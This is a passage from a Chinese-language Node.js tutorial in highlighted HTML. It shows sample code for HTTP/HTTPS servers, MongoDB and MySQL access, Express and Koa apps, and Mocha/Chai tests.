class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running at http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-2-2-处理请求与响应"><a href="#4-2-2-处理请求与响应" class="headerlink" title="4.2.2 处理请求与响应"></a>4.2.2 处理请求与响应</h4><p>在处理客户端请求时，Node.js 提供了 <code>req</code> 对象（表示请求）和 <code>res</code> 对象（表示响应）。</p><p><strong>获取请求的 URL 和方法：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Requested URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request method: <span class="hljs-subst">$&#123;req.method&#125;</span>`</span>);<br><br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Hello, Node.js!&lt;/h1&gt;&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-2-3-使用-https-模块进行安全通信"><a href="#4-2-3-使用-https-模块进行安全通信" class="headerlink" title="4.2.3 使用 https 模块进行安全通信"></a>4.2.3 使用 <code>https</code> 模块进行安全通信</h4><p>使用 <code>https</code> 模块可以创建安全的 HTTPS 服务器。你需要提供 SSL 证书和私钥。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;https&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> options = &#123;<br>  <span class="hljs-attr">key</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private-key.pem&#x27;</span>),<br>  <span class="hljs-attr">cert</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;certificate.pem&#x27;</span>)<br>&#125;;<br><br>https.<span class="hljs-title function_">createServer</span>(options, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, HTTPS world!&#x27;</span>);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">443</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="5-数据库与存储-1"><a href="#5-数据库与存储-1" class="headerlink" title="5. 数据库与存储"></a>5. 数据库与存储</h2><p>Node.js 支持多种数据库，包括 NoSQL（如 MongoDB）和关系型数据库（如 MySQL）。</p><h3 id="5-1-使用-MongoDB"><a href="#5-1-使用-MongoDB" class="headerlink" title="5.1 使用 MongoDB"></a>5.1 使用 MongoDB</h3><p>MongoDB 是一种 NoSQL 数据库，适用于存储 JSON 风格的文档数据。使用 <code>mongoose</code> 库，可以轻松连接和操作 MongoDB 数据库。</p><h4 id="5-1-1-连接到-MongoDB"><a href="#5-1-1-连接到-MongoDB" class="headerlink" title="5.1.1 连接到 MongoDB"></a>5.1.1 连接到 MongoDB</h4><p>安装 <code>mongoose</code> 并连接到 MongoDB 数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mongoose<br></code></pre></td></tr></table></figure><p><strong>连接到 MongoDB：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br>mongoose.<span class="hljs-title function_">connect</span>(<span class="hljs-string">&#x27;mongodb://localhost:27017/mydb&#x27;</span>, &#123; <span class="hljs-attr">useNewUrlParser</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useUnifiedTopology</span>: <span class="hljs-literal">true</span> &#125;);<br><br><span class="hljs-keyword">const</span> db = mongoose.<span class="hljs-property">connection</span>;<br>db.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">console</span>, <span class="hljs-string">&#x27;Connection error:&#x27;</span>));<br>db.<span class="hljs-title function_">once</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MongoDB.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-1-2-CRUD-操作"><a href="#5-1-2-CRUD-操作" class="headerlink" title="5.1.2 CRUD 操作"></a>5.1.2 CRUD 操作</h4><p><strong>定义数据模型：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>创建新文档：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;);<br>user.<span class="hljs-title function_">save</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User saved.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>查询数据：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">User</span>.<span class="hljs-title function_">find</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">err, users</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(users);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-1-3-使用-Mongoose-进行数据建模"><a href="#5-1-3-使用-Mongoose-进行数据建模" class="headerlink" title="5.1.3 使用 Mongoose 进行数据建模"></a>5.1.3 使用 Mongoose 进行数据建模</h4><p><code>Mongoose</code> 提供了 Schema 定义功能，帮助我们对 MongoDB 数据进行建模。</p><p><strong>定义 Schema：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> userSchema = <span class="hljs-keyword">new</span> mongoose.<span class="hljs-title class_">Schema</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span>,<br>  <span class="hljs-attr">email</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, userSchema);<br></code></pre></td></tr></table></figure><h3 id="5-2-使用-MySQL"><a href="#5-2-使用-MySQL" class="headerlink" title="5.2 使用 MySQL"></a>5.2 使用 MySQL</h3><p>MySQL 是一种关系型数据库，Node.js 提供了多种库来连接 MySQL 数据库，如 <code>mysql</code>、<code>sequelize</code> 等。</p><h4 id="5-2-1-连接到-MySQL"><a href="#5-2-1-连接到-MySQL" class="headerlink" title="5.2.1 连接到 MySQL"></a>5.2.1 连接到 MySQL</h4><p>安装 <code>mysql</code> 库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mysql<br></code></pre></td></tr></table></figure><p><strong>连接到 MySQL：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br><br><span class="hljs-keyword">const</span> connection = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;password&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;mydb&#x27;</span><br>&#125;);<br><br>connection.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-2-2-执行-SQL-查询"><a href="#5-2-2-执行-SQL-查询" class="headerlink" title="5.2.2 执行 SQL 查询"></a>5.2.2 执行 SQL 查询</h4><p><strong>执行 SELECT 查询：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>执行 INSERT 查询：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> &#125;;<br>connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;INSERT INTO users SET ?&#x27;</span>, user, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User added.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-2-3-使用-sequelize-进行-ORM-映射"><a href="#5-2-3-使用-sequelize-进行-ORM-映射" class="headerlink" title="5.2.3 使用 sequelize 进行 ORM 映射"></a>5.2.3 使用 <code>sequelize</code> 进行 ORM 映射</h4><p><code>sequelize</code> 是 Node.js 中常用的 ORM 工具，支持 MySQL、PostgreSQL、SQLite 等数据库。</p><p>安装 <code>sequelize</code> 和 MySQL 驱动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install sequelize mysql2<br></code></pre></td></tr></table></figure><p><strong>定义模型并同步数据库：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">Sequelize</span>, <span class="hljs-title class_">DataTypes</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sequelize&#x27;</span>);<br><span class="hljs-keyword">const</span> sequelize = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sequelize</span>(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, &#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">dialect</span>: <span class="hljs-string">&#x27;mysql&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = sequelize.<span class="hljs-title function_">define</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">STRING</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;,<br>  <span class="hljs-attr">age</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">INTEGER</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;<br>&#125;);<br><br>sequelize.<span class="hljs-title function_">sync</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Database synced.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="6-Web-开发与框架-1"><a href="#6-Web-开发与框架-1" class="headerlink" title="6. Web 开发与框架"></a>6. Web 开发与框架</h2><p>Node.js 是开发 Web 应用的热门选择，常用的 Web 框架包括 <strong>Express</strong> 和 <strong>Koa</strong>。</p><h3 id="6-1-使用-Express-框架"><a href="#6-1-使用-Express-框架" class="headerlink" title="6.1 使用 Express 框架"></a>6.1 使用 Express 框架</h3><p><code>Express</code> 是最流行的 Node.js Web 框架，简化了路由处理、请求处理和中间件管理。</p><h4 id="6-1-1-创建基本的-Express-应用"><a href="#6-1-1-创建基本的-Express-应用" class="headerlink" title="6.1.1 创建基本的 Express 应用"></a>6.1.1 创建基本的 Express 应用</h4><p>安装 <code>Express</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure><p><strong>创建简单的 Express 应用：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello, Express!&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-2-路由与中间件"><a href="#6-1-2-路由与中间件" class="headerlink" title="6.1.2 路由与中间件"></a>6.1.2 路由与中间件</h4><p><strong>定义路由：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;req.params.id&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>使用中间件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-3-处理表单和-JSON-数据"><a href="#6-1-3-处理表单和-JSON-数据" class="headerlink" title="6.1.3 处理表单和 JSON 数据"></a>6.1.3 处理表单和 JSON 数据</h4><p><code>Express</code> 可以使用 <code>express.urlencoded()</code> 和 <code>express.json()</code> 中间件来处理表单数据和 JSON 数据。</p><p><strong>处理 JSON 数据：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/submit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Data received.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-4-错误处理"><a href="#6-1-4-错误处理" class="headerlink" title="6.1.4 错误处理"></a>6.1.4 错误处理</h4><p>定义错误处理中间件，捕获路由和中间件中的错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;<br><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="6-2-使用-Koa-框架"><a href="#6-2-使用-Koa-框架" class="headerlink" title="6.2 使用 Koa 框架"></a>6.2 使用 Koa 框架</h3><p><code>Koa</code> 是由 Express 的原始团队设计的新一代 Web 框架，基于中间件的功能更强大、更灵活。</p><h4 id="6-2-1-Koa-的特点与-Express-对比"><a href="#6-2-1-Koa-的特点与-Express-对比" class="headerlink" title="6.2.1 Koa 的特点与 Express 对比"></a>6.2.1 Koa 的特点与 Express 对比</h4><ul><li><strong>更现代化</strong>：Koa 使用 ES6 <code>async/await</code> 处理异步操作，简化了代码逻辑。</li><li><strong>中间件设计</strong>：Koa 的中间件更加灵活，开发者可以完全控制响应流程。</li></ul><h4 id="6-2-2-创建-Koa-应用"><a href="#6-2-2-创建-Koa-应用" class="headerlink" title="6.2.2 创建 Koa 应用"></a>6.2.2 创建 Koa 应用</h4><p>安装 <code>Koa</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install koa<br></code></pre></td></tr></table></figure><p><strong>创建基本 Koa 应用：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Hello, Koa!&#x27;</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-2-3-中间件与路由处理"><a href="#6-2-3-中间件与路由处理" class="headerlink" title="6.2.3 中间件与路由处理"></a>6.2.3 中间件与路由处理</h4><p><strong>定义中间件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx, next) =&gt; &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;ctx.url&#125;</span>`</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>处理路由：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-router&#x27;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;ctx.params.id&#125;</span>`</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">use</span>(router.<span class="hljs-title function_">routes</span>());<br></code></pre></td></tr></table></figure><hr><h2 id="7-测试与调试-1"><a href="#7-测试与调试-1" class="headerlink" title="7. 测试与调试"></a>7. 测试与调试</h2><p>Node.js 提供了多种测试与调试工具，帮助开发者确保代码的正确性和性能。</p><h3 id="7-1-单元测试与集成测试"><a href="#7-1-单元测试与集成测试" class="headerlink" title="7.1 单元测试与集成测试"></a>7.1 单元测试与集成测试</h3><p>单元测试是确保各个模块功能正常的基本方式。<code>Mocha</code> 是 Node.js 中常用的测试框架，配合 <code>Chai</code> 进行断言。</p><h4 id="7-1-1-使用-Mocha-进行单元测试"><a href="#7-1-1-使用-Mocha-进行单元测试" class="headerlink" title="7.1.1 使用 Mocha 进行单元测试"></a>7.1.1 使用 Mocha 进行单元测试</h4><p>安装 <code>Mocha</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save-dev mocha<br></code></pre></td></tr></table></figure><p><strong>编写简单测试：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> assert = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    assert.<span class="hljs-title function_">strictEqual</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>运行测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx mocha<br></code></pre></td></tr></table></figure><h4 id="7-1-2-使用-Chai-进行断言"><a href="#7-1-2-使用-Chai-进行断言" class="headerlink" title="7.1.2 使用 Chai 进行断言"></a>7.1.2 使用 Chai 进行断言</h4><p>安装 <code>Chai</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install chai --save-dev<br></code></pre></td></tr></table></figure><p><strong>使用 <code>Chai</code> 进行更丰富的断言：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> chai = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;chai&#x27;</span>);<br><span class="hljs-keyword">const</span> expect = chai.<span class="hljs-property">expect</span>;<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">expect</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>).<span 